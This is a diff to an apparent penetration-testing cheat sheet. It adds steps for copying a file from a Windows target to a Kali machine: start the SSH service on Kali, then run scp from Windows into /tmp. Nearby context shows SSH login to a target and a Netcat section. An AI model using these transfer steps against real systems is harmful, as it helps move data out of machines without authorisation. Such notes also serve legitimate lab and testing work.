@@ -430,7 +430,12 @@ ssh username@target_ip #enter password if you gave any
 ```
 
 ## File Transfers
+- Windows when you have GUI access on windows and need to get a file from windows to kali
+kali:
+service ssh start 
 
+windows:
+scp <binary> kali@<kali ip>:/tmp
 - Netcat
 
 ```bash
